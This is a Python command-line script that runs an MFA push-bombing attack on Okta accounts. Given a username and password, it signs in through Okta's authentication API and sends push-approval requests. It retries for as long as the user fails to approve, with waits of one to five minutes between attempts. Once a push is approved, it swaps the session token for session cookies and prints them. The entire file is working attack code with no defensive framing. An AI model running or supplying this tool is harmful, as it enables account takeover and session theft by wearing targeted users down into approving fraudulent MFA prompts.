from dataclasses import dataclass
from time import sleep

import requests
from fire import Fire
from tenacity import retry, wait_random, retry_if_exception_type


@dataclass
class OktaMFABomberAuthenticator:
    okta_domain: str

    @retry(wait=wait_random(min=60, max=300), retry=retry_if_exception_type(TimeoutError))
    def get_okta_session(self, username, password):
        base_url = self.okta_domain
        session_url = f'{base_url}/api/v1/authn'
        print(f"Attempting login {username}")

        headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        }

        login_data = {
            'username': username,
            'password': password,
            'options': {
                'multiOptionalFactorEnroll': False,
                'warnBeforePasswordExpired': False
            }
        }

        response = requests.post(session_url, headers=headers, json=login_data)
        if response.status_code != 200:
            raise ValueError("Couldn't authenticate. Probably wrong password.")

        response_dict = response.json()
        # Check for MFA requirement
        if response_dict.get("status") == "MFA_REQUIRED":
            state_token = response_dict.get("stateToken")
            factors = response_dict.get('_embedded').get('factors')
            push_factors = [factor for factor in factors if factor['factorType'] == 'push']
            push_factor = push_factors[0]
            factor_id = push_factor['id']
            factor_url = f"{base_url}/api/v1/authn/factors/{factor_id}/verify"
            factor_data = {
                'stateToken': state_token,
                'factorId': factor_id,
            }
            response = requests.post(factor_url, headers=headers, json=factor_data)
            while response.json()['status'] == 'MFA_CHALLENGE' and response.json()['factorResult'] == 'WAITING':
                sleep(0.5)
                response = requests.post(factor_url, headers=headers, json=factor_data)
            print(response.json())
            if response.json()['status'] == 'SUCCESS':
                print("Got session token")
                return response.json().get('sessionToken')
            else:
                print("Didn't approve")
                raise TimeoutError()
                # print(response.json())

        session_id = response.cookies.get("sid")

        return session_id

    def get_session_cookie_from_session_token(self, session_token):
        # Convert session token to session cookie
        cookies_url = f'{self.okta_domain}/api/v1/sessions?additionalFields=cookieToken'

        response = requests.post(
            cookies_url,
            headers={
                'Accept': 'application/json',
                'Content-Type': 'application/json',
            },
            json={'sessionToken': session_token}
        )

        if response.status_code != 200:
            print('Failed to get session cookie')
            print(response.json())
            return None

        session_cookies = response.cookies
        cookie_token = response.json()['cookieToken']
        return session_cookies, cookie_token
        # print(f'Session cookie: {session_cookie}')


def authenticate_user(okta_domain: str, username: str, password: str):
    if not okta_domain.startswith("http"):
        okta_domain = "https://" + okta_domain
    mfa_bomber = OktaMFABomberAuthenticator(okta_domain)
    session_token = mfa_bomber.get_okta_session(username, password)
    session_cookies, cookie_token = mfa_bomber.get_session_cookie_from_session_token(session_token)
    print(f"Obtained session cookie for user {username}.")
    print(f"cookie_token: {cookie_token}")
    print(f"Cookies: {session_cookies}")


if __name__ == '__main__':
    Fire(authenticate_user)
